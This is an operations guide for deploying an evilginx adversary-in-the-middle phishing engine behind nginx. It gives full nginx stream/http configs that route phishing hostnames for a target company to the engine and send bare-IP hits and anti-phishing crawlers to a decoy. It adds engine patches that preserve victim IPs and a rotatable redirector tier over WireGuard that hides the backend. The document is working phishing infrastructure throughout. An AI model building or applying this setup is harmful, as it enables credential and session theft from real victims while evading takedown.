# nginx in Front of the Engine — Topology

How to put nginx in front of an evilginx engine **correctly**, given that the
engine terminates TLS itself, mints per-host certs, and reads the victim IP off
the raw socket.

---

## The hard constraint (why nginx must be L4, not L7)

The engine is **not** a normal HTTP backend:

- It opens a **raw TCP listener** and peeks the TLS SNI itself (`vhost.TLS`,
  `core/http_proxy.go:1614`), then **mints a per-host certificate** and
  terminates TLS in-process. MITM *requires* it to hold the TLS session.
- It reads the **real client IP** straight off the socket
  (`c.RemoteAddr()`, `core/http_proxy.go:1658`) for blacklist, unauth-IP
  whitelist, and per-session `RemoteAddr`.

Therefore nginx **cannot** be an L7 reverse proxy here. If nginx terminates TLS:
the engine loses its cert logic and SNI routing, and every victim shows up as
`127.0.0.1` — blacklist/whitelist and session attribution break.

➡ **nginx must do L4 SNI pass-through** (`stream` + `ssl_preread`): it routes by
the SNI in the ClientHello and hands the raw TLS bytes to the engine, which keeps
terminating TLS. Real client IP is carried over **PROXY protocol** (see §4).

---

## 1. Port map

| Port (public) | Owner | Role |
|---|---|---|
| `443/tcp` | **nginx** `stream` | SNI pass-through → engine or decoy |
| `80/tcp`  | **nginx** `http`   | HTTP→HTTPS redirect / decoy / ACME HTTP-01 passthrough |

| Port (loopback) | Owner | Role |
|---|---|---|
| `127.0.0.1:8443` | **engine** | TLS listener (`bind_ipv4=127.0.0.1`, `https_port=8443`) |
| `127.0.0.1:8080` | **engine** | ACME HTTP-01 / redirect server (see §3) |
| `127.0.0.1:8081` | decoy/sinkhole | benign site shown to bare-IP hits & scanners |

Engine config to relocate it behind nginx (terminal or config file):

```
config ipv4 bind 127.0.0.1
config https_port 8443
```

---

## 2. nginx `stream` block (443, the phishing path)

```nginx
# /etc/nginx/nginx.conf  — top level, NOT inside http{}
stream {
    map $ssl_preread_server_name $upstream {
        login.target-corp.com   evilginx;
        sso.target-corp.com     evilginx;
        default                 decoy;     # bare IP, unknown SNI, scanners
    }

    upstream evilginx { server 127.0.0.1:8443; }
    upstream decoy    { server 127.0.0.1:8081; }

    log_format sni '$remote_addr [$time_local] sni=$ssl_preread_server_name '
                   '-> $upstream status=$status bytes=$bytes_sent';
    access_log /var/log/nginx/stream.log sni;

    server {
        listen 443;
        listen [::]:443;
        ssl_preread on;            # read SNI without terminating TLS
        proxy_pass $upstream;
        proxy_protocol on;         # prepend real client IP (see §4)
        proxy_timeout 75s;
    }
}
```

- TLS (incl. **TLS-ALPN-01** ACME challenges) flows untouched to the engine,
  so certs still provision live with no port-80 dependency.
- Phishing hostnames route to the engine; **everything else** (bare-IP probes,
  Shodan/anti-phishing crawlers hitting the IP with no/!matching SNI) goes to the
  decoy. This is co-hosting, not detection evasion: scanners that already know the
  phishing hostname still reach the engine.

---

## 3. Port 80 (ACME HTTP-01 + redirect)

The engine's `:80` server is **hardcoded** (`core/http_server.go:23`) and serves
both the ACME HTTP-01 challenge and the HTTP→HTTPS redirect. Two options:

**Option A — recommended, no code change.** Let nginx own 80; rely on
**TLS-ALPN-01** (works natively through the 443 stream) for issuance; nginx does
the redirect. Engine's `:80` is bound to loopback so it doesn't fight nginx — this
needs the small bind patch in §5 (`ACME_HTTP_ADDR`). Then:

```nginx
http {
    server {
        listen 80 default_server;
        listen [::]:80 default_server;
        location /.well-known/acme-challenge/ {
            proxy_pass http://127.0.0.1:8080;   # engine ACME server (loopback)
        }
        location / { return 302 https://$host$request_uri; }
    }
}
```

**Option B — minimal, zero patches.** Don't bind 80 in nginx at all; let the
engine keep public `:80`. nginx only owns 443. You lose an nginx-served decoy on
80 but everything provisions and redirects exactly as stock. Use this to stand the
topology up fast, then move to A.

---

## 4. Preserving the victim IP — PROXY protocol + header trust

How the engine derives the client IP for blacklist/whitelist/session
(`core/http_proxy.go:170-180`):

```
from_ip = socket peer IP
if any of X-Forwarded-For / X-Real-IP / X-Client-IP / Connecting-IP /
   True-Client-IP / Client-IP is present:  from_ip = that header   # header wins
```

In an **L4 SNI pass-through**, nginx does not parse HTTP, so it cannot inject
`X-Real-IP`. Two problems follow:

1. **Socket peer is `127.0.0.1`.** Without PROXY protocol the engine attributes
   every victim to loopback. `127.0.0.1` is the (only) whitelisted IP, so in
   `blacklist all` mode the engine **fails open** — every visitor looks like
   whitelisted localhost and passes — and manual IP blocks never match. Session
   whitelisting collapses all visitors into one bucket.
2. **The header override is attacker-controlled.** The forwarded-IP headers above
   are trusted *unconditionally*. A victim/scanner can set
   `X-Forwarded-For: <anything>` (inside the TLS the engine decrypts) to evade
   blacklist matching, or — in `all` mode — poison the list / spoof the IP recorded
   on the session. This is true of **stock evilginx today**, with or without nginx.

Correct fix (§5), both halves required:

- **Parse PROXY protocol** on the SNI listener so the socket peer is the real
  victim IP.
- **In trusted-proxy mode, ignore the forwarded-IP headers** — the
  PROXY-derived IP is authoritative; client-supplied `X-Forwarded-For` et al. are
  attacker-controlled and must not override it.

> If you skip the patch, set `proxy_protocol off` and accept that the engine sees
> all victims as loopback — blacklist-by-IP, the unauth-IP whitelist, and `all`
> mode are all non-functional. Not recommended for a real engagement.

---

## 5. Required engine changes (additive, opt-in)

1. **PROXY-protocol listener** — new `core/proxyproto.go`: a `net.Listener`
   wrapper parsing PROXY v1 (text) + v2 (binary). In `httpsWorker()`
   (`core/http_proxy.go:1614`) wrap `p.sniListener` when enabled. Gate with
   `-proxy-protocol` flag / `general.proxy_protocol` config (default off).
2. **Ignore forwarded-IP headers in proxy mode** — in the IP-derivation block
   (`core/http_proxy.go:170-180`), skip the `X-Forwarded-For`/`X-Real-IP`/… override
   when running behind the trusted proxy (proxy-protocol mode on). The
   PROXY-derived socket IP is authoritative; the headers are attacker-controlled.
   (Optional hardening even without nginx: only trust those headers from a
   configured trusted-proxy CIDR.)
3. **Configurable ACME/redirect bind** (Option A only) — make
   `core/http_server.go:23` honor an `ACME_HTTP_ADDR` (default `:80`,
   set `127.0.0.1:8080` behind nginx). One-line change.

All follow the project rules: additive, zero new deps, off by default.

---

## 6. Two deployment shapes

### A. Same-box (co-host / process-level obfuscation)
nginx + engine on one VPS. The box answers bare-IP and unknown-SNI traffic with a
benign decoy; only known phishing hostnames reach the engine. Simplest; one IP.

```
         victims ─┐
 scanners ──► nginx:443 (ssl_preread) ─┬─ SNI=phish ─► 127.0.0.1:8443 evilginx
                  nginx:80  (redirect) └─ default   ─► 127.0.0.1:8081 decoy
```

### B. Split redirector tier (origin hiding — fits the fleet model)
nginx on a cheap, **rotatable** front VPS (the IP that lives in DNS) streams over
a private link (WireGuard, per `docs/FLEET_ARCHITECTURE.md`) to the engine on a
**protected backend** VPS. Burn/rotate the front IP without moving the engine or
re-issuing nothing but DNS. Real client IP rides PROXY protocol across the tunnel.

```
 victims ─► front VPS  nginx:443 ssl_preread ──(WireGuard)──► backend VPS
                       proxy_protocol on                       evilginx :8443
            (public, rotatable IP)                             (no public 443)
```

Notes for shape B:
- Engine binds the **WG interface** (`bind_ipv4 = <wg-ip>`), never `0.0.0.0`.
- ACME: TLS-ALPN-01 works through the stream to the backend; for HTTP-01, stream
  port 80 over WG to the backend's loopback ACME server too.
- This is the same private-mesh shape the agent API already uses (P5), so the
  redirector and the control plane share one WG fabric.

---

## 7. Verification checklist

- `openssl s_client -connect <ip>:443 -servername login.target-corp.com` →
  engine's per-host cert; `-servername anything.else` or no SNI → decoy cert.
- Engine session log shows the **victim's** public IP, not `127.0.0.1`
  (confirms PROXY protocol end-to-end).
- `config` in the engine terminal shows `bind_ipv4 127.0.0.1` (or WG IP),
  `https_port 8443`.
- New cert provisions live after enabling a phishlet (TLS-ALPN-01 through nginx).
- Blacklist an IP → that source is dropped at the engine (proves IP is real).
```
